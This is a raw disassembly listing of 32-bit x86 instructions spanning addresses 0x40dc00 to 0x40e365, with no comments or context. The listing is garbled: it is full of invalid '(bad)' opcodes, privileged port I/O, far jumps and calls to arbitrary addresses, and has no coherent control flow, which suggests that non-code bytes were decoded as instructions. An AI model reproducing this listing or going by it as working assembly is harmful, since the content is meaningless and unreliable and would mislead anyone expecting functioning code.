  40dc00:	cmp    al,0xd4
  40dc02:	inc    esi
  40dc03:	into   
  40dc04:	mov    dh,0x0
  40dc06:	xchg   al,dl
  40dc08:	test   al,0xcb
  40dc0a:	sub    ecx,0xffffffc9
  40dc0d:	test   BYTE PTR [ebp+0x65],0x96
  40dc11:	fcomp  DWORD PTR [ebx+0x25e5c0f0]
  40dc17:	out    dx,al
  40dc18:	fwait
  40dc19:	shr    DWORD PTR [edi],0x72
  40dc1c:	pop    ss
  40dc1d:	mov    cs,esi
  40dc1f:	fist   WORD PTR [edx-0x46]
  40dc22:	out    0x2f,al
  40dc24:	adc    al,0x76
  40dc26:	pusha  
  40dc27:	xchg   ecx,eax
  40dc28:	lock inc ebx
  40dc2a:	sub    ch,BYTE PTR [edx+0x45ef003c]
  40dc30:	push   cs
  40dc31:	pop    esi
  40dc32:	stos   DWORD PTR es:[edi],eax
  40dc33:	stos   DWORD PTR es:[edi],eax
  40dc34:	lds    eax,FWORD PTR ss:[ecx-0x10df51ec]
  40dc3b:	push   ds
  40dc3c:	ror    bl,1
  40dc3e:	and    al,0x8f
  40dc40:	xchg   edx,eax
  40dc41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc42:	es push esp
  40dc44:	into   
  40dc45:	std    
  40dc46:	or     esi,0x46
  40dc49:	push   eax
  40dc4a:	lahf   
  40dc4b:	ja     0x40dc0c
  40dc4d:	(bad)
  40dc50:	mov    al,0x33
  40dc52:	retf   0x2cb6
  40dc55:	mov    cl,0xc3
  40dc57:	push   esp
  40dc58:	xchg   edx,eax
  40dc59:	add    edx,DWORD PTR [ecx]
  40dc5b:	scas   al,BYTE PTR es:[edi]
  40dc5c:	xchg   esp,eax
  40dc5d:	mov    ds:0xcd2c4df6,eax
  40dc62:	mov    ebp,0x7467f1fc
  40dc67:	xor    dh,BYTE PTR [ecx]
  40dc69:	inc    eax
  40dc6a:	or     eax,0x5186889a
  40dc6f:	mov    esi,0x12c27453
  40dc74:	xor    edi,esi
  40dc76:	aad    0xc1
  40dc78:	mov    bh,0x77
  40dc7a:	xor    BYTE PTR [ebp-0x5746387b],ah
  40dc80:	adc    DWORD PTR [edx],eax
  40dc82:	push   eax
  40dc83:	adc    BYTE PTR [ebx-0x3a],dh
  40dc86:	into   
  40dc87:	pop    eax
  40dc88:	sbb    ch,bl
  40dc8a:	pushf  
  40dc8b:	call   0xcd362a79
  40dc90:	stos   BYTE PTR es:[edi],al
  40dc91:	and    ebx,DWORD PTR [ebp-0x54]
  40dc94:	sar    BYTE PTR [ecx],1
  40dc96:	lods   al,BYTE PTR ds:[esi]
  40dc97:	xchg   edi,eax
  40dc98:	mov    cl,0xb5
  40dc9a:	push   esi
  40dc9b:	or     DWORD PTR [edi-0x18],ebp
  40dc9e:	pushf  
  40dc9f:	dec    ecx
  40dca0:	or     al,0x13
  40dca2:	sar    DWORD PTR [ebx-0x78],cl
  40dca5:	sbb    al,0x49
  40dca7:	and    edi,DWORD PTR [edx-0x74]
  40dcaa:	and    esi,eax
  40dcac:	sub    BYTE PTR [esi+esi*1+0x1d457ea9],dh
  40dcb3:	mov    dh,0x9a
  40dcb5:	sub    ebx,ebx
  40dcb7:	mov    ds:0x68668f5d,eax
  40dcbc:	in     eax,dx
  40dcbd:	xchg   DWORD PTR [eax+0x1a1d14bb],ebp
  40dcc3:	mov    ah,BYTE PTR [ecx+0x66]
  40dcc6:	call   0x3ffcf9d4
  40dccb:	rcr    DWORD PTR [ebx-0x11],cl
  40dcce:	jne    0x40dc6c
  40dcd0:	enter  0x5e0,0xd4
  40dcd4:	add    BYTE PTR ds:0x2d5492f9,al
  40dcda:	xchg   DWORD PTR [ebx-0x6af15f8],edx
  40dce0:	mov    ebp,0x171bb1bb
  40dce5:	stos   DWORD PTR es:[edi],eax
  40dce6:	adc    ah,bh
  40dce8:	xor    bl,BYTE PTR [bp+si]
  40dceb:	rcl    BYTE PTR [eax+0x21],0xa2
  40dcef:	das    
  40dcf0:	in     al,0xa4
  40dcf2:	sub    dh,BYTE PTR [ebx+0x4fe9ccff]
  40dcf8:	mov    ecx,0xc7f59ea0
  40dcfd:	bound  edx,QWORD PTR [edi+0x57785ae3]
  40dd03:	and    al,0x89
  40dd05:	in     eax,0x8a
  40dd07:	ds (bad) 
  40dd09:	push   ecx
  40dd0b:	cld    
  40dd0c:	in     eax,dx
  40dd0d:	sbb    BYTE PTR [eax+edx*8+0x1edda3a9],0x5
  40dd15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd16:	not    al
  40dd18:	call   0xa2ef:0x13d004a2
  40dd1f:	into   
  40dd20:	ins    DWORD PTR es:[edi],dx
  40dd21:	inc    eax
  40dd22:	jle    0x40dcf5
  40dd24:	outs   dx,BYTE PTR ds:[esi]
  40dd25:	inc    esi
  40dd26:	ins    DWORD PTR es:[edi],dx
  40dd27:	pop    eax
  40dd28:	in     al,0xbd
  40dd2a:	shl    BYTE PTR [edi-0xb],0xd3
  40dd2e:	cmc    
  40dd2f:	jmp    0x65f8:0xf248afc5
  40dd36:	ins    DWORD PTR es:[edi],dx
  40dd37:	rcl    DWORD PTR [edx],1
  40dd39:	sub    al,0xcc
  40dd3b:	jns    0x40dd08
  40dd3d:	sub    esp,eax
  40dd3f:	dec    edx
  40dd40:	js     0x40dd1d
  40dd42:	dec    esp
  40dd43:	push   edi
  40dd44:	cmp    DWORD PTR [esi-0xc],0x54e35164
  40dd4b:	push   cs
  40dd4c:	lock mov fs,WORD PTR [edx+0x23d1b2eb]
  40dd53:	add    al,0x94
  40dd55:	and    dh,ch
  40dd57:	leave  
  40dd58:	aaa    
  40dd59:	mov    ds:0x4b238a14,al
  40dd5e:	inc    edi
  40dd5f:	push   esi
  40dd60:	(bad)  
  40dd61:	jmp    0x203dd30b
  40dd66:	scas   eax,DWORD PTR es:[edi]
  40dd67:	pop    ds
  40dd68:	cmp    edx,DWORD PTR [ebx-0xfac46f7]
  40dd6e:	pop    edi
  40dd6f:	dec    edx
  40dd70:	pop    es
  40dd71:	mov    esp,DWORD PTR [ecx]
  40dd73:	mov    eax,0xd3e2443e
  40dd78:	rol    esp,cl
  40dd7a:	outs   dx,BYTE PTR ds:[esi]
  40dd7b:	adc    BYTE PTR [eax+0x4386f6f],0xd2
  40dd82:	mov    WORD PTR [ebx+0x1b224115],fs
  40dd88:	and    edx,DWORD PTR [ecx]
  40dd8a:	das    
  40dd8b:	xchg   ebp,eax
  40dd8c:	es sub cl,0x1e
  40dd90:	das    
  40dd91:	gs xchg ebp,eax
  40dd93:	outs   dx,DWORD PTR ds:[esi]
  40dd94:	ret    
  40dd95:	or     BYTE PTR [edi],bl
  40dd97:	ins    BYTE PTR es:[edi],dx
  40dd98:	icebp  
  40dd99:	pop    ecx
  40dd9a:	dec    esi
  40dd9b:	adc    ax,0x109c
  40dd9f:	xor    al,0x7b
  40dda1:	mov    bh,0xb
  40dda3:	cmp    al,0x7d
  40dda5:	mov    ds:0x924d7f10,al
  40ddaa:	int3   
  40ddab:	adc    DWORD PTR [esi+0x79a9dcf9],esp
  40ddb1:	in     eax,0x1
  40ddb3:	xchg   DWORD PTR ds:0xfd4523bf,ecx
  40ddb9:	pop    esi
  40ddba:	ficom  WORD PTR [ebp+0x19]
  40ddbd:	movups XMMWORD PTR [edi-0x2c],xmm6
  40ddc1:	mov    dl,BYTE PTR [edx+0x2dc5bd4b]
  40ddc7:	jns    0x40dd73
  40ddc9:	addr16 inc edx
  40ddcb:	inc    ebp
  40ddcc:	fild   DWORD PTR [ecx]
  40ddce:	lods   eax,DWORD PTR ds:[esi]
  40ddcf:	jno    0x40dd72
  40ddd1:	add    esi,DWORD PTR [esi]
  40ddd3:	push   edi
  40ddd4:	cmp    dh,al
  40ddd6:	inc    edx
  40ddd7:	xor    BYTE PTR [ecx-0x24f0d8f7],bl
  40dddd:	pop    ebp
  40ddde:	mov    BYTE PTR [edx-0x35],cl
  40dde1:	cmp    BYTE PTR [eax],dl
  40dde3:	mov    edx,0x5fd17581
  40dde8:	adc    esp,ebx
  40ddea:	or     ebp,eax
  40ddec:	push   edi
  40dded:	pop    ecx
  40ddee:	rcr    DWORD PTR [edx+0x25],cl
  40ddf1:	nop
  40ddf2:	pop    ds
  40ddf3:	and    al,0xd3
  40ddf5:	dec    esi
  40ddf6:	inc    esp
  40ddf7:	das    
  40ddf8:	push   ecx
  40ddf9:	aam    0x54
  40ddfb:	in     al,0xa9
  40ddfd:	sbb    esi,ebp
  40ddff:	mov    esp,0x45fc48fe
  40de04:	push   ebx
  40de05:	ror    edi,0xa4
  40de08:	(bad)  
  40de09:	cmp    dl,bh
  40de0b:	dec    edi
  40de0c:	js     0x40de41
  40de0e:	pop    edx
  40de0f:	outs   dx,BYTE PTR ds:[esi]
  40de10:	shl    BYTE PTR [ebx],0xcd
  40de13:	jp     0x40de61
  40de15:	in     eax,dx
  40de16:	rcr    DWORD PTR [eax+0x382d9a46],0x32
  40de1d:	mov    edx,0x92242ae5
  40de22:	out    dx,al
  40de23:	(bad)  
  40de24:	adc    BYTE PTR [ebx-0xf],dl
  40de27:	pop    ebx
  40de28:	ficomp DWORD PTR [edi]
  40de2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de2b:	cld    
  40de2c:	sbb    BYTE PTR ds:0x43a2f7e8,cl
  40de32:	addr16 rol esi,0x23
  40de36:	sub    eax,0xb44712e0
  40de3b:	adc    dl,ch
  40de3d:	aam    0xa4
  40de3f:	dec    ebp
  40de40:	in     eax,0xe6
  40de42:	in     eax,0x3
  40de44:	xor    esi,0xffffff92
  40de47:	sub    eax,0x8a1febee
  40de4c:	push   es
  40de4d:	arpl   WORD PTR [edi+0x9],bx
  40de50:	add    dl,cl
  40de52:	test   DWORD PTR [eax+0x553e4ebf],edx
  40de58:	rcl    DWORD PTR [edx+0x541a803d],1
  40de5e:	jo     0x40de0f
  40de60:	sahf   
  40de61:	(bad)  
  40de62:	(bad)  
  40de63:	in     al,0xa8
  40de65:	adc    eax,0x2eeb4eca
  40de6a:	(bad)  
  40de6b:	mov    dh,0xf7
  40de6d:	mov    ds:0xf2e2495a,al
  40de72:	adc    BYTE PTR [esi-0x7e],al
  40de75:	fidivr DWORD PTR [ebx-0x1a619124]
  40de7b:	jmp    0xa74b:0xe17296ac
  40de82:	rcr    BYTE PTR ds:0x13a04120,cl
  40de88:	mov    cl,0x26
  40de8a:	cdq    
  40de8b:	xor    al,0xc
  40de8d:	or     al,0x54
  40de8f:	shl    DWORD PTR [ebx-0x38cd8e30],cl
  40de95:	push   0xda2c4c33
  40de9a:	or     DWORD PTR [esi-0x5f],ebx
  40de9d:	and    edi,edx
  40de9f:	pop    ebp
  40dea0:	int3   
  40dea1:	ret    0xa4bc
  40dea4:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dea6:	mov    ecx,0x860c6650
  40deab:	pop    edi
  40deac:	sub    edx,esp
  40deae:	mov    di,0x91d
  40deb2:	xor    al,0x3b
  40deb4:	pop    edi
  40deb6:	inc    DWORD PTR [esi-0x5b]
  40deb9:	jp     0x40df19
  40debb:	imul   edx,DWORD PTR [edi+0x4c],0x2faf7028
  40dec2:	fdiv   st(3),st
  40dec4:	jle    0x40dec5
  40dec6:	fwait
  40dec7:	and    ebx,0xfff11776
  40decd:	popa   
  40dece:	repz sar DWORD PTR [esi+edx*2+0x2986710e],0xd7
  40ded7:	mov    dl,0x2b
  40ded9:	jp     0x40df20
  40dedb:	fs imul ah
  40dede:	mov    ecx,0x76a1e7f2
  40dee3:	mov    eax,ds:0x4932fb97
  40dee8:	fld    st(3)
  40deea:	pusha  
  40deeb:	cmp    DWORD PTR [edi],ebx
  40deed:	aaa    
  40deee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deef:	fld    QWORD PTR ds:0xab42338a
  40def5:	out    0x61,al
  40def7:	push   ebx
  40def8:	xor    BYTE PTR [esi+0x32c59c1b],al
  40defe:	lea    ebx,[ebp+0x5a76f8dd]
  40df04:	mov    edi,0x7fda18fb
  40df09:	fadd   DWORD PTR [ebx+ebp*8-0x3]
  40df0d:	hlt    
  40df0e:	pop    edx
  40df0f:	adc    eax,0xa9e7c0e5
  40df14:	iret   
  40df15:	jbe    0x40dede
  40df17:	adc    eax,0x1a19463f
  40df1c:	xor    BYTE PTR [ebp-0x59b0a6d8],dh
  40df22:	out    0x4,al
  40df24:	cmp    eax,0x318f3dd8
  40df29:	lods   al,BYTE PTR ds:[esi]
  40df2a:	and    BYTE PTR [edx+0x268fa0c1],dl
  40df30:	clc    
  40df31:	sbb    BYTE PTR [edx+0x6b],cl
  40df34:	mov    ch,0xc0
  40df36:	push   ebx
  40df37:	sar    DWORD PTR [eax+0x4f29f92b],0xe3
  40df3e:	pop    ebx
  40df3f:	or     ebx,ecx
  40df41:	jecxz  0x40df2b
  40df43:	mov    eax,0xcede916a
  40df48:	ds mov bh,0xdf
  40df4b:	cmp    al,BYTE PTR [edi]
  40df4d:	fstp   TBYTE PTR [esi+0x61]
  40df50:	mov    ds:0x4f3b7cc3,eax
  40df55:	lods   al,BYTE PTR ds:[esi]
  40df56:	push   edx
  40df57:	pop    es
  40df58:	adc    esi,esp
  40df5a:	mov    al,ds:0x23055a4a
  40df5f:	sbb    BYTE PTR [edi],bh
  40df61:	retf   
  40df62:	mov    esi,0x64e9a5c5
  40df67:	adc    eax,0xde7b656b
  40df6c:	add    al,0x7
  40df6e:	iret   
  40df6f:	(bad)  
  40df70:	xchg   esp,eax
  40df71:	call   0x2c263896
  40df76:	clc    
  40df77:	jecxz  0x40df0d
  40df79:	mov    bl,0xfd
  40df7b:	xor    eax,0x186d215a
  40df80:	mov    cl,0xfe
  40df82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df83:	xor    DWORD PTR [ecx+0x7b471d86],ecx
  40df89:	adc    ecx,esi
  40df8b:	data16 xor al,ch
  40df8e:	adc    ecx,DWORD PTR [ecx-0x21cfe732]
  40df94:	das    
  40df95:	int    0x3c
  40df97:	xchg   ebx,eax
  40df98:	jo     0x40e00b
  40df9a:	dec    ebx
  40df9b:	jnp    0x40dfb5
  40df9d:	das    
  40df9e:	stc    
  40df9f:	or     esp,DWORD PTR [ebx+0xc8c4299]
  40dfa5:	rcl    BYTE PTR [esi+0x45f20b13],1
  40dfab:	jge    0x40df48
  40dfad:	mov    edi,0x43e46500
  40dfb2:	mov    ds:0x89160787,al
  40dfb7:	inc    ebx
  40dfb8:	test   esp,edx
  40dfba:	scas   eax,DWORD PTR es:[edi]
  40dfbb:	xor    al,0x1e
  40dfbd:	(bad)
  40dfc0:	jne    0x40dff0
  40dfc2:	sub    esp,edx
  40dfc4:	push   edx
  40dfc5:	cli    
  40dfc6:	lea    ebx,[edi]
  40dfc8:	imul   esi,DWORD PTR [ebx-0x1f],0xffffff98
  40dfcc:	scas   eax,DWORD PTR es:[edi]
  40dfcd:	fs pop edi
  40dfcf:	test   al,0x2e
  40dfd1:	fist   WORD PTR [esi+0x5]
  40dfd4:	xor    ecx,0x3c4a152a
  40dfda:	test   bl,dl
  40dfdc:	mov    esi,0xea6def4f
  40dfe1:	stos   BYTE PTR es:[edi],al
  40dfe2:	sub    eax,0x1c549d77
  40dfe7:	or     al,0xa8
  40dfe9:	rol    dh,1
  40dfeb:	adc    esp,DWORD PTR [eax-0x66]
  40dfee:	loope  0x40e01c
  40dff0:	add    bl,BYTE PTR [ebp-0x4adbe90b]
  40dff6:	lea    eax,[ebp+0x10ce20d9]
  40dffc:	sbb    eax,0xd15e0dac
  40e001:	sub    eax,0x7dab9212
  40e006:	gs push ds
  40e008:	push   edi
  40e009:	sahf   
  40e00a:	xchg   ecx,eax
  40e00b:	int3   
  40e00c:	lods   al,BYTE PTR ds:[esi]
  40e00d:	mov    ss:0x9a4559e3,al
  40e013:	mov    edi,0x1181e153
  40e018:	sti    
  40e019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e01a:	jmp    0x154ce970
  40e01f:	inc    ecx
  40e020:	mov    cl,0x10
  40e022:	enter  0x41de,0xde
  40e026:	fistp  QWORD PTR [eax-0x1c141750]
  40e02c:	push   ds
  40e02d:	cwde   
  40e02e:	fwait
  40e02f:	in     eax,dx
  40e030:	shr    al,1
  40e032:	jne    0x40e01e
  40e034:	push   edx
  40e035:	nop
  40e036:	(bad)  
  40e037:	jne    0x40dfe4
  40e039:	xor    al,0xab
  40e03b:	mov    edx,0x6af75ca7
  40e040:	cmp    DWORD PTR [esi+0x5a],ebx
  40e043:	or     al,0x89
  40e045:	daa    
  40e046:	or     ch,al
  40e048:	ja     0x40e0b3
  40e04a:	leave  
  40e04b:	test   al,0x2a
  40e04d:	jl     0x40e014
  40e04f:	div    DWORD PTR [edx-0x650db2e8]
  40e055:	xchg   edi,eax
  40e056:	push   0xffffff88
  40e058:	and    al,0x69
  40e05a:	rcl    BYTE PTR [ebp+0x10],0xaf
  40e05e:	xor    al,0xa0
  40e060:	iret   
  40e061:	cwde   
  40e062:	icebp  
  40e063:	sub    dh,BYTE PTR [eax]
  40e065:	loope  0x40e0d3
  40e067:	cmc    
  40e068:	mov    dl,0x61
  40e06a:	sub    BYTE PTR [ecx+0xb],ah
  40e06d:	sbb    ah,BYTE PTR [ecx]
  40e06f:	pop    ecx
  40e070:	sub    eax,0xbacc7bc6
  40e075:	or     edx,DWORD PTR [edx]
  40e077:	xchg   edx,eax
  40e078:	sbb    al,0x8f
  40e07a:	pop    edx
  40e07b:	xchg   BYTE PTR [ecx+0x7bae20b2],cl
  40e081:	in     al,dx
  40e082:	ins    BYTE PTR es:[edi],dx
  40e083:	mov    esi,ecx
  40e085:	cld    
  40e086:	scas   al,BYTE PTR es:[edi]
  40e087:	not    DWORD PTR [ebp+0x259e4ada]
  40e08d:	cmp    edi,edi
  40e08f:	pop    ecx
  40e090:	xor    eax,DWORD PTR ds:0x1721a1c9
  40e096:	add    DWORD PTR [ecx+0x56],0xffffffdc
  40e09a:	pop    edi
  40e09b:	retf   
  40e09c:	jb     0x40e042
  40e09e:	dec    edx
  40e09f:	jg     0x40e115
  40e0a1:	in     eax,dx
  40e0a2:	out    dx,eax
  40e0a3:	scas   eax,DWORD PTR es:[edi]
  40e0a4:	jnp    0x40e070
  40e0a6:	cld    
  40e0a7:	push   ebx
  40e0a8:	fsub   QWORD PTR [esi-0x16]
  40e0ab:	nop
  40e0ac:	mov    edx,0x6c262557
  40e0b1:	or     eax,0xa461cb9d
  40e0b6:	fnstenv [eax-0x216c8284]
  40e0bc:	arpl   si,sp
  40e0be:	test   al,0xca
  40e0c0:	and    eax,0x45db5206
  40e0c5:	push   ecx
  40e0c6:	out    dx,al
  40e0c7:	pop    DWORD PTR [esi]
  40e0c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ca:	jne    0x40e145
  40e0cc:	sbb    eax,0x4f1f3512
  40e0d1:	push   ss
  40e0d2:	jmp    0x707873c8
  40e0d7:	xor    dl,ch
  40e0d9:	mov    BYTE PTR [ebp*4+0x67a1f5a6],dl
  40e0e0:	lods   al,BYTE PTR ds:[esi]
  40e0e1:	mov    ch,0x8e
  40e0e3:	sar    DWORD PTR [eax-0x72],cl
  40e0e6:	mov    bl,0x39
  40e0e8:	push   esi
  40e0e9:	inc    ebp
  40e0ea:	inc    esi
  40e0eb:	mov    ds:0xaf6e8cd1,al
  40e0f0:	test   esi,0x44ab092a
  40e0f6:	sub    edi,DWORD PTR fs:[eax]
  40e0f9:	inc    edi
  40e0fa:	jl     0x40e164
  40e0fc:	cmp    eax,0xffccf54a
  40e101:	in     al,0xac
  40e103:	mov    ch,0x14
  40e105:	pop    ecx
  40e106:	xchg   edx,eax
  40e107:	outs   dx,BYTE PTR ds:[esi]
  40e108:	ins    DWORD PTR es:[edi],dx
  40e109:	jmp    0x248f:0x7b7ca595
  40e110:	cdq    
  40e111:	dec    ecx
  40e112:	or     cl,BYTE PTR [ecx-0x12]
  40e115:	and    BYTE PTR [ebx-0x26],dl
  40e118:	in     al,0xea
  40e11a:	int3   
  40e11b:	bound  eax,QWORD PTR [edx]
  40e11d:	fidiv  WORD PTR [edx-0x74d2bca1]
  40e123:	add    BYTE PTR cs:[edx+eiz*4+0x21],bl
  40e128:	push   es
  40e129:	or     al,0x52
  40e12b:	fsubp  st(0),st
  40e12d:	mov    DWORD PTR [esi+eax*2],eax
  40e130:	ja     0x40e0f4
  40e132:	push   edi
  40e133:	addr16 cs mov ah,0xe3
  40e137:	or     ah,BYTE PTR [edx]
  40e139:	mov    eax,0xe0391669
  40e13e:	cwde   
  40e13f:	mov    ebx,DWORD PTR [ecx-0x1d465563]
  40e145:	and    DWORD PTR [edx+eiz*8+0x0],0x4c31df9c
  40e14d:	or     DWORD PTR [edi-0x42],0xde156a7e
  40e154:	sti    
  40e155:	dec    esp
  40e156:	dec    ebx
  40e157:	jnp    0x40e130
  40e159:	data16 loope 0x40e154
  40e15c:	ret    
  40e15d:	fiadd  DWORD PTR [edi]
  40e15f:	pop    eax
  40e160:	sub    edx,DWORD PTR [esi-0x3bde7c2c]
  40e166:	repnz (bad) 
  40e168:	or     dh,BYTE PTR [ebx-0x49dceb21]
  40e16e:	xor    ecx,eax
  40e170:	shr    ecx,1
  40e172:	lods   al,BYTE PTR ds:[esi]
  40e173:	push   ss
  40e174:	hlt    
  40e175:	push   ebp
  40e176:	add    BYTE PTR [eax],ch
  40e178:	mov    al,ds:0x3e923b8a
  40e17d:	mov    ah,0xd8
  40e17f:	rcl    BYTE PTR [eax-0x7e],1
  40e182:	test   eax,0x53aa921
  40e187:	ret    0xdc55
  40e18a:	dec    eax
  40e18b:	add    al,0x43
  40e18d:	push   cs
  40e18e:	sub    edx,DWORD PTR [edx+0x37]
  40e191:	(bad)  
  40e192:	shr    ebp,cl
  40e194:	nop
  40e195:	retf   
  40e196:	retf   
  40e197:	pop    ecx
  40e198:	or     esi,DWORD PTR [edi]
  40e19a:	jp     0x40e11e
  40e19c:	mov    al,ds:0x437d28ae
  40e1a1:	mov    al,0x81
  40e1a3:	test   al,0xb2
  40e1a5:	scas   al,BYTE PTR es:[edi]
  40e1a6:	or     al,0x5d
  40e1a8:	mov    al,0x2e
  40e1aa:	inc    ecx
  40e1ab:	stc    
  40e1ac:	cmp    BYTE PTR [edx],bl
  40e1ae:	jne    0x40e19e
  40e1b0:	jmp    0x83c18a31
  40e1b5:	out    0xa7,eax
  40e1b7:	popa   
  40e1b8:	mov    al,ds:0x34f16bb4
  40e1bd:	(bad)  
  40e1be:	and    edx,DWORD PTR ds:0x5fbfb83e
  40e1c4:	bound  ecx,QWORD PTR [ecx-0x2f77189c]
  40e1ca:	pop    ss
  40e1cb:	mov    cl,0x92
  40e1cd:	mov    dh,0x28
  40e1cf:	scas   eax,DWORD PTR es:[edi]
  40e1d0:	push   ds
  40e1d1:	xchg   ebp,eax
  40e1d2:	pop    ebx
  40e1d3:	stc    
  40e1d4:	sbb    al,BYTE PTR ds:[edx-0x1d552f6c]
  40e1db:	sub    BYTE PTR [eax],bl
  40e1dd:	addr16 retf 
  40e1df:	jg     0x40e25f
  40e1e1:	lods   eax,DWORD PTR ds:[esi]
  40e1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1e3:	jo     0x40e1ef
  40e1e5:	call   0x32a82ad1
  40e1ea:	adc    BYTE PTR [esi+0x4c18ffe9],ah
  40e1f0:	jno    0x40e1e6
  40e1f2:	mov    ebx,0xfd88dd7f
  40e1f7:	xchg   esi,eax
  40e1f8:	call   DWORD PTR [ebx+0x13bb3dae]
  40e1fe:	sbb    DWORD PTR [ecx],esi
  40e200:	push   ss
  40e201:	jae    0x40e221
  40e203:	fimul  DWORD PTR [ebp+0x24]
  40e206:	pusha  
  40e207:	adc    dl,BYTE PTR [ebx+0x60a78822]
  40e20d:	sub    BYTE PTR [esp+ecx*8-0x6],bl
  40e211:	push   ebp
  40e212:	xchg   edi,eax
  40e213:	cdq    
  40e214:	outs   dx,BYTE PTR ds:[esi]
  40e215:	sbb    al,0x62
  40e217:	leave  
  40e218:	sbb    eax,0xf92e948d
  40e21d:	dec    esi
  40e21e:	test   eax,0x7520d73
  40e223:	mov    DWORD PTR [edx],esi
  40e225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e226:	loop   0x40e1e6
  40e228:	in     al,dx
  40e229:	js     0x40e207
  40e22b:	xchg   ebx,eax
  40e22c:	push   ds
  40e22d:	scas   eax,DWORD PTR es:[edi]
  40e22e:	hlt    
  40e22f:	push   es
  40e230:	retf   0x1a36
  40e233:	call   0xa7953dd3
  40e238:	in     al,0xb1
  40e23a:	outs   dx,BYTE PTR ds:[esi]
  40e23b:	sub    BYTE PTR [edx-0x5bc9cb2],ah
  40e241:	fstp   DWORD PTR gs:[eax+0x3]
  40e245:	aas    
  40e246:	adc    al,0x67
  40e248:	in     eax,dx
  40e249:	js     0x40e2b0
  40e24b:	in     eax,dx
  40e24c:	add    eax,0xf61414f8
  40e251:	xor    DWORD PTR [edx-0x50bf65a],eax
  40e257:	or     al,0x7
  40e25a:	pop    esi
  40e25b:	push   eax
  40e25c:	(bad)  
  40e25d:	mov    edx,0x817e91ee
  40e262:	and    BYTE PTR [eax-0xd],ch
  40e265:	ja     0x40e22b
  40e267:	test   eax,0xcb544f6
  40e26c:	(bad)  
  40e26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e26e:	ror    BYTE PTR ds:0x9f795143,1
  40e274:	das    
  40e275:	mov    edi,0x8b9844f2
  40e27a:	dec    ebp
  40e27b:	dec    ecx
  40e27c:	jbe    0x40e281
  40e27e:	pop    ebx
  40e27f:	dec    ebp
  40e280:	sub    al,0x48
  40e282:	addr16 jg 0x40e2f1
  40e285:	pop    ds
  40e286:	in     al,dx
  40e287:	jle    0x40e267
  40e289:	push   edi
  40e28a:	leave  
  40e28b:	xchg   ecx,eax
  40e28c:	adc    dl,BYTE PTR [edi]
  40e28e:	xchg   BYTE PTR [eax+ebx*1+0x3],al
  40e292:	and    eax,edx
  40e294:	lahf   
  40e295:	pop    ebp
  40e296:	jo     0x40e2ad
  40e298:	sbb    dl,BYTE PTR [esi]
  40e29a:	pop    es
  40e29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e29c:	or     DWORD PTR [edx+ecx*2-0x6c],ebp
  40e2a0:	dec    edx
  40e2a1:	dec    eax
  40e2a2:	cdq    
  40e2a3:	int    0xf2
  40e2a5:	in     eax,dx
  40e2a6:	and    eax,0x7bd0a64d
  40e2ab:	hlt    
  40e2ac:	test   eax,0xe841c578
  40e2b1:	push   es
  40e2b2:	cmp    cl,ah
  40e2b4:	stc    
  40e2b5:	push   edx
  40e2b6:	pop    edi
  40e2b7:	pop    ebp
  40e2b8:	and    eax,0x1a3599dd
  40e2bd:	xchg   edx,eax
  40e2be:	mov    al,0x67
  40e2c0:	dec    ecx
  40e2c1:	jnp    0x40e2d5
  40e2c3:	dec    ecx
  40e2c4:	mov    ah,BYTE PTR [eax-0x56]
  40e2c7:	out    0x67,eax
  40e2c9:	frstor [edi]
  40e2cb:	(bad)  [ebp+0x6e]
  40e2ce:	xchg   esp,eax
  40e2cf:	(bad)
  40e2d2:	lods   al,BYTE PTR ds:[esi]
  40e2d3:	outs   dx,BYTE PTR ds:[esi]
  40e2d4:	sbb    DWORD PTR [edx+0x520c4573],edi
  40e2da:	inc    eax
  40e2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2dc:	jae    0x40e299
  40e2de:	pushf  
  40e2df:	jg     0x40e2c1
  40e2e1:	aaa    
  40e2e2:	ja     0x40e2a2
  40e2e4:	into   
  40e2e5:	mov    esi,0xf916a6a2
  40e2ea:	(bad)  
  40e2eb:	(bad)  
  40e2ed:	cmp    eax,edx
  40e2ef:	xor    DWORD PTR [esi+0x73226f05],0xffffffba
  40e2f6:	stos   BYTE PTR es:[edi],al
  40e2f7:	pop    ecx
  40e2f8:	out    dx,eax
  40e2f9:	repz mov ah,0x3
  40e2fc:	out    0x9e,eax
  40e2fe:	jmp    0x742e:0x3dd199ad
  40e305:	loop   0x40e29c
  40e307:	mov    dl,0x6b
  40e309:	int    0x69
  40e30b:	pop    esi
  40e30c:	cwde   
  40e30d:	test   esi,eax
  40e30f:	jle    0x40e32d
  40e311:	popf   
  40e312:	imul   ebp
  40e314:	addr16 iret 
  40e316:	in     eax,0x7b
  40e318:	outs   dx,BYTE PTR ds:[esi]
  40e319:	fisttp WORD PTR [edx+0x41]
  40e31c:	sar    DWORD PTR [eax+0xb],1
  40e31f:	inc    ecx
  40e320:	xchg   ebp,eax
  40e321:	inc    edi
  40e322:	mov    esi,0xb091ec84
  40e327:	sbb    esi,DWORD PTR [ebx-0x20]
  40e32a:	mov    ecx,0xbd90b902
  40e32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e330:	or     eax,0xe174c4e6
  40e335:	cmp    eax,0x6bb9083b
  40e33a:	sub    eax,0xec875af0
  40e33f:	and    dl,ch
  40e341:	scas   eax,DWORD PTR es:[edi]
  40e342:	mov    dh,0x2e
  40e344:	jbe    0x40e311
  40e346:	xchg   esp,eax
  40e347:	das    
  40e348:	in     al,dx
  40e349:	or     DWORD PTR [ebp+0xc],0xffffffb7
  40e34d:	dec    ebp
  40e34e:	inc    edi
  40e34f:	sub    eax,DWORD PTR [ebp-0x71]
  40e352:	mov    dh,ch
  40e354:	xor    BYTE PTR [esi-0xecdf461],0x5
  40e35b:	and    edi,edi
  40e35d:	mov    ds:0x4a3fb228,eax
  40e362:	sahf   
  40e363:	sbb    al,0xe
  40e365:	shr    esi,cl
